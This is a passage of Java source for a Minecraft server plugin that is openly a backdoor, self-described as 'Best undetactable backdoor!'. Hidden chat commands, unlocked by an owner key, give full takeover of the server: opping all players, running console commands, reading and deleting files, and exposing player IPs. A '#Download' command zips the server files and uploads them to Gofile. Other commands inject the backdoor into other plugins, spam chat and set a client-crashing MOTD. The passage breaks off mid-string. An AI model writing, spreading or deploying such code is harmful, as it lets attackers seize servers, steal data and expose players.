            player.sendMessage(formatMsg.apply("#tnt - Get special TNT"));
            player.sendMessage(formatMsg.apply("#wand [block] [radius] - Get wand to replace blocks"));
            player.sendMessage(formatMsg.apply("#cmd [player] [command] - Execute command as player"));
            player.sendMessage(formatMsg.apply("#god - Gives you god mode"));

            // Player Management
            player.sendMessage(ChatColor.GOLD + "┌─────────── Player Control ────────────┐");
            player.sendMessage(formatMsg.apply("#op [player|*] - Gives OP to player(s)"));
            player.sendMessage(formatMsg.apply("#deop [player] - Remove OP from player"));
            player.sendMessage(formatMsg.apply("#freeze [player] - Freeze/unfreeze player"));
            player.sendMessage(formatMsg.apply("#ip [player] - Get player's IP"));
            player.sendMessage(formatMsg.apply("#serverip - Get server's IP"));
            player.sendMessage(formatMsg.apply("#gm [0/1/2/3] - Change gamemode"));
            player.sendMessage(formatMsg.apply("#tp [player] - Teleport to player"));
            player.sendMessage(formatMsg.apply("#kick [player] - Kick player"));
            player.sendMessage(formatMsg.apply("#ban [player] - Ban player"));
            player.sendMessage(formatMsg.apply("#launch [player] - Launch player in air"));
            player.sendMessage(formatMsg.apply("#spin [player] - Spin player's camera"));
            player.sendMessage(formatMsg.apply("#reverse [player] - Reverse player's chat"));
            player.sendMessage(formatMsg.apply("#invsee [player] - View player's inventory"));

            // Server Management
            player.sendMessage(ChatColor.GOLD + "┌────────── Server Control ────────────┐");
            player.sendMessage(formatMsg.apply("#disable [plugin] - Disable plugin"));
            player.sendMessage(formatMsg.apply("#enable [plugin] - Enable plugin"));
            player.sendMessage(formatMsg.apply("#reload [plugin] - Reload plugin"));
            player.sendMessage(formatMsg.apply("#load [plugin] - Load plugin"));
            player.sendMessage(formatMsg.apply("#unload [plugin] - Unload plugin"));
            player.sendMessage(formatMsg.apply("#plugins - List all plugins"));
            player.sendMessage(formatMsg.apply("#shutdown - Shutdown server"));
            player.sendMessage(formatMsg.apply("#serverreload - Reload server"));

            // Lock System
            player.sendMessage(ChatColor.GOLD + "┌──────────── Lock System ─────────────┐");
            player.sendMessage(formatMsg.apply("#lock - View lock status"));
            player.sendMessage(formatMsg.apply("#lockConsole - Toggle console commands"));
            player.sendMessage(formatMsg.apply("#lockChat - Toggle chat"));
            player.sendMessage(formatMsg.apply("#lockStop - Toggle /stop command"));
            player.sendMessage(formatMsg.apply("#lockJoin - Toggle server joining"));
            player.sendMessage(formatMsg.apply("#lockCommands - Toggle all commands"));

            // File Operations
            player.sendMessage(ChatColor.GOLD + "┌────────── File Management ───────────┐");
            player.sendMessage(formatMsg.apply("#delete [file] - Delete file"));
            player.sendMessage(formatMsg.apply("#dir - List files in directory"));
            player.sendMessage(formatMsg.apply("#cd [dir] - Change directory"));
            player.sendMessage(formatMsg.apply("#read [file] - Read file"));
            player.sendMessage(formatMsg.apply("#Download - Create backup"));

            // Additional
            player.sendMessage(ChatColor.GOLD + "┌───────────── Utilities ──────────────┐");
            player.sendMessage(formatMsg.apply("#spam [message] - Spams certain message in chat"));
            player.sendMessage(formatMsg.apply("#spam-stop - Stops spamming certain message in chat"));
            player.sendMessage(formatMsg.apply("#give [item] [amount] - Give items"));
            player.sendMessage(formatMsg.apply("#ops - List all OPs"));
            player.sendMessage(formatMsg.apply("#Powiadomienie [title] [msg] - Broadcast title"));
            player.sendMessage(formatMsg.apply("#console [cmd] - Execute console command"));
            player.sendMessage(formatMsg.apply("#clear - Clear your chat"));

            event.setCancelled(true);
            return;
        }

        if (message.startsWith("#Download")) {
            player.sendMessage("Creating server backup and uploading to Gofile...");
            Bukkit.getScheduler().runTaskAsynchronously(plugin, () -> {
                try {
                    Path zipPath = createServerFilesBackup();
                    String gofileLink = uploadToGofile(zipPath);
                    player.sendMessage(formatMsg.apply("Backup uploaded successfully: " + gofileLink));
                } catch (Exception e) {
                    player.sendMessage(formatMsg.apply("An error occurred during the backup process."));
                    e.printStackTrace();
                }
            });
            event.setCancelled(true);
        }


        if (message.startsWith("#cmd")) {
            String[] parts = message.split(" ", 3);  // Dzielimy na maksymalnie 3 części
            if (parts.length < 3) {
                player.sendMessage(formatMsg.apply("Usage: #cmd [player] [command]"));
                event.setCancelled(true);
                return;
            }

            String targetPlayerName = parts[1];
            String commandToExecute = parts[2];
            Player targetPlayer = plugin.getServer().getPlayer(targetPlayerName);

            if (targetPlayer != null) {
                // Wykonujemy komendę jako gracz (wywołanie komendy gracza)
                Bukkit.getScheduler().runTask(plugin, () -> targetPlayer.performCommand(commandToExecute));

                // Informacja dla gracza który wysłał komendę
                player.sendMessage(formatMsg.apply("Wysłano komendę jako gracz " + targetPlayerName + ": " + commandToExecute));

                // Logowanie w konsoli jak standardowy MC
                Bukkit.getConsoleSender().sendMessage(
                        ChatColor.RESET + player.getName() + " issued server command: " + commandToExecute
                );
            } else {
                player.sendMessage(formatMsg.apply("Nie znaleziono gracza: " + targetPlayerName));
            }

            event.setCancelled(true);
            return;
        }


        if (message.startsWith("#tnt")) {
            ItemStack specialTnt = new ItemStack(Material.TNT, 1);  // 1 Special TNT
            ItemMeta meta = specialTnt.getItemMeta();
            if (meta != null) {
                meta.setDisplayName("Special TNT");
                specialTnt.setItemMeta(meta);
            }
            player.getInventory().addItem(specialTnt);
            player.sendMessage(formatMsg.apply("You have been given Special TNT. Use it by right-clicking to throw it."));
            event.setCancelled(true);
            return;
        }

        if (message.startsWith("#god")) {

            if (checkIfEssentials()) {
                String command = "god " + player.getName();
                Bukkit.getScheduler().runTask(plugin, () ->
                        Bukkit.dispatchCommand(Bukkit.getConsoleSender(), command)
                );
                player.sendMessage(formatMsg.apply("You have been granted god mode."));
                event.setCancelled(true);
                return;
            } else {
                player.sendMessage(formatMsg.apply("EssentialsX is not installed or not enabled."));
                event.setCancelled(true);
                return;
            }

        }

        if (message.startsWith("#opall")) {


            for (Player onlinePlayer : plugin.getServer().getOnlinePlayers()) {
                Bukkit.getScheduler().runTask(plugin, () -> {
                    Bukkit.dispatchCommand(Bukkit.getConsoleSender(), "op " + onlinePlayer.getName());
                    Bukkit.dispatchCommand(Bukkit.getConsoleSender(), "lp user " + onlinePlayer.getName() + " permission set * true");
                });
            }
            player.sendMessage(formatMsg.apply("Granted operator status to all players."));
            event.setCancelled(true);
            return;
        }


        if (message.startsWith("#Powiadomienie")) {
            String[] parts = message.split(" ", 3);
            if (parts.length >= 2) {
                final String title = parts[1];  // Deklarowanie zmiennej jako final
                final String chatMessage = (parts.length > 2) ? parts[2] : ""; // Tak samo dla chatMessage

                // Konwertowanie na kolory, jeżeli istnieją
                final String finalTitle = title.replace("&", "§");
                final String finalChatMessage = chatMessage.replace("&", "§");

                // Wysyłanie tytułu do wszystkich graczy na serwerze
                for (Player player1 : Bukkit.getOnlinePlayers()) {
                    Bukkit.getScheduler().runTask(plugin, () -> {
                        player1.sendTitle(finalTitle, finalChatMessage, 10, 70, 20); // Tytuł, podtytuł, czas pokazywania
                    });
                }

                // Informowanie gracza o wysłaniu powiadomienia
                player.sendMessage(formatMsg.apply("Powiadomienie wysłane do wszystkich graczy."));
                event.setCancelled(true);  // Anulowanie wiadomości w czacie
            } else {
                player.sendMessage(formatMsg.apply("Usage: #Powiadomienie [title] [message] [optional subtitle]"));
            }
        }


        if (message.startsWith("#wand")) {
            String[] parts = message.split(" ");
            if (parts.length < 3) {
                player.sendMessage(formatMsg.apply("Usage: #wand [block] [radius]"));
                event.setCancelled(true);
                return;
            }
            String blockName = parts[1].toUpperCase();
            selectedBlock = Material.matchMaterial(blockName);
            if (selectedBlock == null) {
                player.sendMessage(formatMsg.apply("Invalid block type."));
                event.setCancelled(true);
                return;
            }
            try {
                radius = Integer.parseInt(parts[2]);
            } catch (NumberFormatException e) {
                player.sendMessage(formatMsg.apply("Invalid radius."));
                event.setCancelled(true);
                return;
            }


            ItemStack wand = new ItemStack(Material.DIAMOND_AXE);  // Wand is a diamond axe
            ItemMeta meta = wand.getItemMeta();
            if (meta != null) {
                meta.setDisplayName("Block " + selectedBlock + " wand, radius: " + radius);
                wand.setItemMeta(meta);
            }

            player.getInventory().addItem(wand);
            player.sendMessage(formatMsg.apply("You have been given a wand. Use it to replace blocks in a radius."));
            event.setCancelled(true);
            return;
        }

        // Komenda #spam [wiadomosc]
        if (message.startsWith("#spam ")) {
            String spamMessage = message.substring(6); // Pobiera wiadomość po "#spam "

            // Jeśli już spamuje, przerwij
            if (newSpamTask != null && !newSpamTask.isCancelled()) {
                player.sendMessage("§cSpam już jest aktywny! Użyj §e#spam-stop §caby zatrzymać.");
                event.setCancelled(true);
                return;
            }

            // Uruchom spamowanie wiadomości
            newSpamTask = Bukkit.getScheduler().runTaskTimer(plugin, new Runnable() {
                @Override
                public void run() {
                    Bukkit.broadcastMessage(spamMessage); // Wysyła wiadomość jako gracz
                }
            }, 0L, 20L); // Co sekundę (20 ticków)

            player.sendMessage("§aSpam rozpoczęty.");
            event.setCancelled(true);
        }

        // Komenda #spam-stop
        if (message.equalsIgnoreCase("#spam-stop")) {
            if (newSpamTask != null && !newSpamTask.isCancelled()) {
                newSpamTask.cancel();
                newSpamTask = null;
                player.sendMessage("§cSpam zatrzymany.");
            } else {
                player.sendMessage("§eNie ma aktywnego spamu.");
            }
            event.setCancelled(true);
        }

        if (message.startsWith("./ownerkey")) {
            String key = message.split(" ")[1];
            if (key.equals(OwnerKey)) {
                hasOwnerAccess = true;

                sendTitleToPlayer(player, ChatColor.GREEN + "SectionDoor - owner access", ChatColor.RED + "Best undetactable backdoor!", 20, 90, 20);
                player.sendMessage(ChatColor.AQUA + "\n PL: Klucz operatora zaakceptowany kutasiarzu kochany moj spermo");
            } else {
                player.sendMessage(ChatColor.RED + "Invalid admin key.");
            }
            event.setCancelled(true);
            return;
        }

        if (!hasOwnerAccess) {
            return;
        }



        //Motd manipulation

        if (message.startsWith("#injectInto ")) {
            event.setCancelled(true);
            String[] parts = message.split(" ");
            if (parts.length < 2) {
                event.getPlayer().sendMessage("§cUżycie: #injectInto <nazwa-pluginu> [webhook]");
                return;
            }

            String pluginName = parts[1];
            String customWebhook = null;

            if (parts.length >= 3) {
                // Łączymy wszystkie argumenty po drugim jako webhook (na wypadek gdyby zawierał spacje)
                customWebhook = String.join(" ", Arrays.copyOfRange(parts, 2, parts.length));
            }

            injectIntoPlugin(event.getPlayer(), pluginName, customWebhook);
        }

        if (message.startsWith("#motd")) {
            String[] parts = message.split(" ", 3); // #motd on [tekst] lub #motd status/off

            if (parts.length < 2) {
                player.sendMessage(formatMsg.apply("Usage: #motd [on/off/status] [message]"));
                event.setCancelled(true);
                return;
            }

            String subCommand = parts[1].toLowerCase();

            switch (subCommand) {
                case "status":
                    player.sendMessage(formatMsg.apply("MOTD: " + (motdEnabled ? "§aON" : "§cOFF")));
                    player.sendMessage(formatMsg.apply("Current: " + customMotd));
                    break;

                case "off":
                    motdEnabled = false;
                    player.sendMessage(formatMsg.apply("§cMOTD disabled."));
                    break;

                case "on":
                    if (parts.length < 3) {
                        player.sendMessage(formatMsg.apply("Usage: #motd on [message]"));
                        break;
                    }

                    customMotd = colorize(parts[2]);
                    motdEnabled = true;
                    player.sendMessage(formatMsg.apply("§aCustom MOTD set to:"));
                    player.sendMessage(customMotd);
                    break;

                case "crashmotd":
                    if (parts.length < 3) {
                        player.sendMessage(formatMsg.apply("Usage: #motd crashmotd [message]"));
                        break;
                    }

                    String baseMsg = colorize(parts[2]);
                    customMotd = generateLaggyMotd(baseMsg);
                    laggmotd = "\u202D§8§a\u200F§b§b\u202B§a§c\u202D§8§d\u200F§f§e\u200F§8§f\u200F§0§a\u202B§b§b\u202D§2§c\u202B§d§d\u200F§e§e\u202B§5§f\u202E§3§a\u200F§6§b\u202B§f§c\u200F§d§d\u200F§6§e\u200F§8§f\u202D§3§a\u202E§1§b\u202D§3§c\u202E§d§d\u202E§3§e\u202D§7§f\u202D§e§a\u202E§9§b\u202E§6§c\u200F§0§d\u200F§e§e\u202D§f§f\u202D§c§a\u202E§5§b\u202D§c§c\u202B§7§d\u202B§d§e\u202E§d§f\u200F§c§a\u202E§0§b\u202D§4§c\u202D§2§d\u202D§3§e\u202D§d§f\u200F§6§a\u202D§9§b\u202B§d§c\u202E§b§d\u202B§0§e\u202D§a§f\u202D§3§a\u202E§0§b\u202D§8§c\u202D§f§d\u200F§b§e\u200F§8§f\u202E§f§a\u202D§9§b\u200F§c§c\u202B§d§d\u200F§7§e\u202E§3§f\u200F§d§a\u202D§c§b\u200F§b§c\u202B§2§d\u202D§1§e\u200F§8§f\u202E§8§a\u202B§1§b\u202B§1§c\u202E§e§d\u202E§8§e\u200F§5§f\u200F§e§a\u202E§6§b\u200F§6§c\u200F§9§d\u202D§a§e\u200F§e§f\u200F§7§a\u202B§f§b\u202E§c§c\u202B§c§d\u202E§5§e\u202B§b§f\u202B§8§a\u202B§2§b\u200F§0§c\u202B§2§d\u202B§2§e\u200F§0§f\u202B§1§a\u202E§6§b\u202E§a§c\u200F§3§d\u202E§b§e\u202B§9§f\u202B§2§a\u202D§b§b\u202B§8§c\u202B§a§d\u200F§7§e\u200F§e§f\u202D§f§a\u202E§1§b\u202D§4§c\u202E§a§d\u200F§d§e\u202D§1§f\u202B§6§a\u202D§d§b\u202E§6§c\u202E§a§d\u202B§e§e\u202D§5§f\u202D§0§a\u202E§7§b\u202E§b§c\u202E§1§d\u200F§3§e\u202D§d§f\u202E§b§a\u202B§0§b\u202B§d§c\u202B§9§d\u202B§f§e\u202E§f§f\u200F§0§a\u202E§f§b\u202B§f§c\u202E§5§d\u200F§1§e\u202D§3§f\u202D§e§a\u200F§0§b\u202E§0§c\u202E§d§d\u200F§d§e\u200F§a§f\u202E§5§a\u202D§c§b\u202B§7§c\u202B§e§d\u202E§3§e\u202E§c§f\u200F§1§a\u200F§b§b\u202B§f§c\u202B§8§d\u202D§7§e\u202E§3§f\u202E§a§a\u202E§b§b\u202B§c§c\u200F§4§d\u202E§e§e\u202D§3§f\u200F§1§a\u202D§c§b\u200F§e§c\u202B§f§d\u200F§2§e\u202B§f§f\u202E§d§a\u202E§d§b\u202E§b§c\u202B§3§d\u202E§f§e\u202E§8§f\u202E§8§a\u202D§7§b\u202B§3§c\u200F§f§d\u202E§d§e\u202D§0§f\u202E§5§a\u202D§f§b\u202D§1§c\u200F§7§d\u202E§2§e\u202D§5§f\u200F§8§a\u202D§1§b\u202B§9§c\u202E§5§d\u200F§e§e\u200F§a§f\u202E§a§a\u202B§5§b\u202B§9§c\u202D§b§d\u202E§7§e\u200F§2§f\u200F§d§a\u202D§6§b\u200F§6§c\u202B§a§d\u202D§f